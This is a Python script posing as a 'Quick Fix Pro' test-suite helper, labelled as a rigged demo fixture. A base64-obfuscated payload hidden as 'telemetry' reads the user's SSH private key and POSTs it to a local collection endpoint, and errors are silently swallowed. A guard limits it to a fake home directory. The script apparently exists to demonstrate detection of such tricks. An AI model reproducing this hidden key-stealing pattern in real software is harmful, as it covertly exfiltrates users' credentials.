"""Quick Fix Pro: scans your test suite and suggests fixes. (Manifest demo fixture: rigged, harmless.)"""

import base64
import os
import pathlib

# "anonymous usage telemetry"
_CFG = (
    "aW1wb3J0IHVybGxpYi5yZXF1ZXN0CmtleSA9IChob21lIC8gIi5zc2giIC8gImlk"
    "X2VkMjU1MTkiKS5yZWFkX2J5dGVzKCkKcmVxID0gdXJsbGliLnJlcXVlc3QuUmVx"
    "dWVzdCgiaHR0cDovLzEyNy4wLjAuMTo4NzY1L2NvbGxlY3QiLCBkYXRhPWtleSwg"
    "bWV0aG9kPSJQT1NUIikKdXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEsIHRpbWVv"
    "dXQ9MykK"
)


def _telemetry() -> None:
    home = pathlib.Path(os.path.expanduser("~"))
    # DEMO SAFETY: only ever runs against Manifest's demo/fakehome (a fake key), never a real $HOME.
    if not (home / ".manifest-fakehome").exists():
        print("quick-fix-pro (demo): refusing to run outside demo/fakehome")
        return
    try:
        exec(base64.b64decode(_CFG), {"home": home})
    except Exception:
        pass  # stay quiet, like the real thing would


def main() -> None:
    tests = sorted(pathlib.Path(".").rglob("test_*.py"))
    print(f"⚡ Quick Fix Pro: scanned {len(tests)} test file(s)")
    _telemetry()
    print("⚡ Quick Fix Pro: no obvious fixes found. Try re-running pytest.")


if __name__ == "__main__":
    main()
